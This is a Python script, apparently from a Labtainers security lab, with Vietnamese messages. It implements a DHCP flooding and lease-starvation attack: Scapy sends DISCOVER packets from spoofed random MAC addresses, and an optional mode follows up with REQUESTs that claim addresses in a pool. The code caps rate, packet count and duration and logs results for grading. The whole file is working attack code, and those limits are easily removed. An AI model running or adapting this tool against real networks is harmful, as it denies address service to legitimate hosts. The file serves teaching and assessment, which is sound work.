#!/usr/bin/env python3
"""
attack-controlled.sh - Công cụ mô phỏng DHCP Flooding có kiểm soát trong mạng Lab cô lập
Hỗ trợ các mức cấu hình sẵn (--level low|medium|high) hoặc tùy chỉnh (--rate, --count, --timeout),
có giới hạn an toàn tuyệt đối (rate cap, packet cap, timeout cap) và ghi log phục vụ đánh giá.
"""
import os
import sys
import time
import signal
import random
import argparse
import subprocess

try:
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
except ImportError:
    print("[ERROR] Thiếu thư viện python3-scapy.")
    sys.exit(1)

PID_FILE = "/var/run/dhcp_attack.pid"
ATTACK_LOG = "/var/log/attack_flood.log"
LOCAL_RESULT_LOG = "/home/ubuntu/.local/result/attack_flood.log"

MAX_RATE_CAP = 100.0
MAX_COUNT_CAP = 300
MAX_TIMEOUT_CAP = 15.0

PRESETS = {
    "low":    {"rate": 10.0, "count": 20,  "timeout": 6.0},
    "medium": {"rate": 25.0, "count": 60,  "timeout": 10.0},
    "high":   {"rate": 40.0, "count": 100, "timeout": 12.0},
}

stop_requested = False

def handle_sig(signum, frame):
    global stop_requested
    stop_requested = True

signal.signal(signal.SIGINT, handle_sig)
signal.signal(signal.SIGTERM, handle_sig)

def detect_lab_interface():
    try:
        out = subprocess.check_output(["ip", "-o", "link", "show"], text=True)
        for line in out.splitlines():
            if "02:42:0a:0a:" in line:
                iface = line.split(":")[1].strip().split("@")[0]
                return iface
    except Exception:
        pass
    return "eth0"

def random_mac():
    return "02:fe:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(4))

def write_log(msg):
    for path in [ATTACK_LOG, LOCAL_RESULT_LOG]:
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "a", encoding="utf-8") as f:
                f.write(msg + "\n")
            os.chmod(path, 0o666)
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Controlled DHCP Flooding Tool for Labtainers")
    parser.add_argument("--level", choices=["low", "medium", "high"], default="medium",
                        help="Mức độ flooding cấu hình sẵn: low (20 gói @ 10/s), medium (60 gói @ 25/s), high (100 gói @ 40/s)")
    parser.add_argument("--rate", type=float, default=None, help="Tốc độ gửi gói mỗi giây (tối đa 100 pkt/s)")
    parser.add_argument("--count", type=int, default=None, help="Tổng số gói DHCP Discover gửi đi (tối đa 300 gói)")
    parser.add_argument("--timeout", type=float, default=None, help="Thời gian chạy tối đa tính bằng giây (tối đa 15s)")
    parser.add_argument("--iface", type=str, default=None, help="Giao diện mạng lab (mặc định tự động xác minh)")
    parser.add_argument("--starve", action="store_true", help="Gửi kèm DHCPREQUEST sau khi Server cấp Offer để kiểm chứng chiếm dụng Pool Lease")
    args = parser.parse_args()

    preset = PRESETS[args.level]
    rate = min(args.rate if args.rate is not None else preset["rate"], MAX_RATE_CAP)
    count = min(args.count if args.count is not None else preset["count"], MAX_COUNT_CAP)
    timeout = min(args.timeout if args.timeout is not None else preset["timeout"], MAX_TIMEOUT_CAP)
    iface = args.iface or detect_lab_interface()
    interval = 1.0 / max(1.0, rate)

    try:
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))
    except Exception:
        pass

    print("==================================================================")
    print("[*] MÔ PHỎNG TẤN CÔNG DHCP FLOODING CÓ KIỂM SOÁT (ISOLATED LAB)")
    print(f"    - Giao diện mạng : {iface} (EXTERNAL_NET 10.10.0.0/24)")
    print(f"    - Mức cấu hình   : {args.level.upper()} | Tốc độ: {rate} pkt/s | Giới hạn: {count} gói | Timeout: {timeout}s")
    print("    - Dừng khẩn cấp  : Nhấn Ctrl+C hoặc chạy 'attack-stop.sh'")
    print("==================================================================")

    start_ts = time.time()
    sent_discover = 0
    sent_request = 0
    unique_macs = []
    unique_xids = []

    for i in range(count):
        if stop_requested or (time.time() - start_ts) >= timeout:
            print("\n[!] Đã dừng sớm theo yêu cầu hoặc chạm ngưỡng timeout an toàn.")
            break

        mac = random_mac()
        xid = random.randint(1, 0x7FFFFFFF)
        unique_macs.append(mac)
        unique_xids.append(xid)
        chaddr = bytes.fromhex(mac.replace(":", "")) + b"\x00" * 10

        disc_pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=chaddr, xid=xid, flags=0x8000) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(disc_pkt, iface=iface, verbose=False)
        sent_discover += 1

        if (i + 1) % 10 == 0 or (i + 1) == count:
            print(f"  -> Đã gửi [{i+1}/{count}] gói DHCP DISCOVER (MAC giả mạo mẫu={mac})")

        time.sleep(interval)

    # Nếu bật --starve, đợi 1.1s để ISC DHCP Server hoàn tất ping check và gửi DHCPOFFER,
    # sau đó gửi DHCPREQUEST khớp (mac, xid) để chiếm dụng các IP trong dải 10.10.0.101..10.10.0.130
    if args.starve and not stop_requested:
        print("  [*] Đang gửi tiếp các gói DHCP REQUEST để kiểm tra mức độ chiếm dụng Pool Lease...")
        time.sleep(1.1)
        starve_count = min(30, len(unique_macs))
        for j in range(starve_count):
            if stop_requested or (time.time() - start_ts) >= timeout:
                break
            mac = unique_macs[j]
            xid = unique_xids[j]
            chaddr = bytes.fromhex(mac.replace(":", "")) + b"\x00" * 10
            req_ip = f"10.10.0.{101 + j}"
            req_pkt = (
                Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(op=1, chaddr=chaddr, xid=xid, flags=0x8000) /
                DHCP(options=[
                    ("message-type", "request"),
                    ("requested_addr", req_ip),
                    ("server_id", "192.168.0.100"),
                    "end"
                ])
            )
            sendp(req_pkt, iface=iface, verbose=False)
            sent_request += 1
            time.sleep(interval)

    elapsed = max(0.01, time.time() - start_ts)
    actual_rate = round((sent_discover + sent_request) / elapsed, 2)

    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except Exception:
        pass

    summary = (
        f"ATTACK_COMPLETED: time={time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())} "
        f"iface={iface} level={args.level} discover={sent_discover} request={sent_request} "
        f"unique_macs={len(set(unique_macs))} unique_xids={len(set(unique_xids))} "
        f"duration={elapsed:.2f}s rate={actual_rate}pkt/s"
    )
    write_log(summary)
    print("------------------------------------------------------------------")
    print(f"[OK] Hoàn tất đợt mô phỏng! {summary}")
    print("==================================================================")

if __name__ == "__main__":
    main()
